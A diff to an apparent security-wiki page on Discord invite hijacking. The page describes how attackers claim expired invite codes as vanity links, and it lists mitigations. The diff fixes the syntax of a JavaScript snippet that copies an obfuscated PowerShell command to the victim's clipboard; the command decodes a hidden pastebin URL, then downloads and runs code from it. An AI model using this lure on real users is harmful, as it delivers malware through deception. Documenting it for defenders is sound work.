@@ -1,6 +1,5 @@
 # Discord Invite Hijacking
 
-
 Discord’s invite system vulnerability allows threat actors to claim expired or deleted invite codes (temporary, permanent, or custom vanity) as new vanity links on any Level 3 boosted server. By normalizing all codes to lowercase, attackers can pre-register known invite codes and silently hijack traffic once the original link expires or the source server loses its boost.
 
 ## Invite Types and Hijack Risk
@@ -38,13 +37,13 @@ Discord’s invite system vulnerability allows threat actors to claim expired or
 
 ```javascript
 // Copy malicious PowerShell command to clipboard
-const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa'; +
-            `$u=($r[-1..-($r.Length)]-join ''); +
-            `$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u)); +
-            `iex (iwr -Uri $url)";
+const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
+            `$u=($r[-1..-($r.Length)]-join '');` +
+            `$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
+            `iex (iwr -Uri $url)"`;
 navigator.clipboard.writeText(cmd);
 ```
-```
+
 This approach avoids direct file downloads and leverages familiar UI elements to lower user suspicion.
 
 ## Mitigations
@@ -56,6 +55,6 @@ This approach avoids direct file downloads and leverages familiar UI elements to
 
 ## References
 
-- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – [[https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/|https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/]]
-- Discord Custom Invite Link Documentation – [[https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link|https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link]]
+- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – [https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
+- Discord Custom Invite Link Documentation – [https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
 
